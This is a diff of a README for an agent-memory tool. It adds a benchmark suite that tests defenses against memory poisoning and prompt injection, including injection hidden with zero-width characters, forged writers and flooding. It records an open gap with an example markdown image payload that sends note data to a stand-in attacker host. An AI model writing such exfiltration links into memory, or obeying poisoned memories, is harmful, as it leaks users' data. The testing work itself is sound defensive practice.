@@ -363,7 +363,7 @@ does not: [docs/trust.md](./docs/trust.md).
 `onememory bench` checks the provenance behaviour a shared agent memory needs: that one agent cannot silently turn a weak
 guess into shared truth. It is deterministic, offline, uses no model, and runs on a throwaway store through the real REST API
 (`npm run bench` from a checkout; `--json` for every scenario with expected vs actual; exit 1 on any failure, so it can gate CI).
-It has four suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/onememory/tree/main/bench/scenarios).
+It has five suites, as plain JSON scenario files you can extend in [`bench/scenarios/`](https://github.com/calasdan-sketch/onememory/tree/main/bench/scenarios).
 
 | Suite | Scenarios | What it checks | Headline number |
 |---|---|---|---|
@@ -371,6 +371,7 @@ It has four suites, as plain JSON scenario files you can extend in [`bench/scena
 | B  Contradiction recovery | 31 | writer A vs writer B, then a trusted correction; distrusting the bad writer; weak overwrite of a trusted note; restoring the trusted text from history; the trust guard on replacing | resolved to the correction, loser stays visible, overwrite protected |
 | C  Permission isolation | 27 | cross-tenant read/write/search/export/import/merge/sweep, token scopes, admin-only flags, signed imports, and (1.6.0) that one tenant cannot read another's history, preview, undo or reuse a confirmation code | `leakage-count` (must be 0), `unexpected-denials` |
 | D  Provenance retention | 19 | source, writer, creator, timestamps, deletion deadline, confidence after export, import, merge, update | `fields-lost` |
+| E  Memory poisoning | 14 | injected or malicious memories never reach an agent as trusted content: prompt-injection (plain, forged tags, zero-width-obfuscated) is quarantined; a distrusted/low-trust writer cannot outrank or silently overwrite a trusted fact; secrets are redacted (capture) or blocked (write); a forged writer/namespace is stamped with the real one; an unsigned import cannot pose as verified; a captured web fetch is not trusted memory; SessionStart injection carries the untrusted-data banner and leaves distrusted notes out; mass near-duplicate flooding cannot bury the answer | `poison-reach-count` (must be 0) |
 
 **What it does not measure.** It is not a retrieval-quality or semantic-search benchmark (keyword search, made-up unique words, no
 embeddings). It does not measure speed, scale or concurrency, and "0 leaks" means none of *these* probes leaked; it is a regression gate,
@@ -390,7 +391,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 [docs/replacing-memories.md](./docs/replacing-memories.md).
 
 **Known gaps.** Scenarios that fail because OneMemory lacks the behaviour are kept, marked, and listed here and in the report. They do not fail the run
-(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. **At 1.6.0 none is open**: the four recorded at 1.5.0 are fixed.
+(`--strict-gaps` makes them), and a gap that starts to pass fails the run until its marker is removed. The four recorded at 1.5.0 are fixed; **one is open**: the memory-poisoning suite found that markdown image/link data-exfiltration payloads are not flagged (`GAP-POISON-MDLINK`).
 
 | Gap | What was missing | Status | Scenarios |
 |---|---|---|---|
@@ -399,6 +400,7 @@ Nothing is deleted, undo is one command, and every edit now keeps the text it re
 | `GAP-HISTORY` | No version history of bodies; after a bad overwrite the trusted original was not recoverable from OneMemory. | **Fixed in 1.6.0**: bounded, admin-only history with restore (restore is a new version). | B08, B09 (now pass) |
 | `GAP-REST-CAS` | The REST `PUT /notes/:id` ignored `if_rev`. | **Fixed in 1.5.0**: it takes `if_rev` and answers 409. | B16 (passes) |
 | `GAP-CONFIDENCE` | No confidence field; a client could send one but it was dropped silently. | **Fixed in 1.6.0**: optional, validated, labelled as a claim. | D10 (now passes) |
+| `GAP-POISON-MDLINK` | The write-time linter does not flag markdown images/links whose URL smuggles note data out (e.g. `![x](https://attacker/p?data=...)`); such a note is stored as ordinary memory. | **Open (roadmap)**: add an injection-category pattern for off-allowlist markdown image/link URLs carrying note-derived data. The read-side untrusted-data banner still warns the agent, so this is defense-in-depth. | E11 (fails on purpose) |
 
 ## Security in one paragraph
 
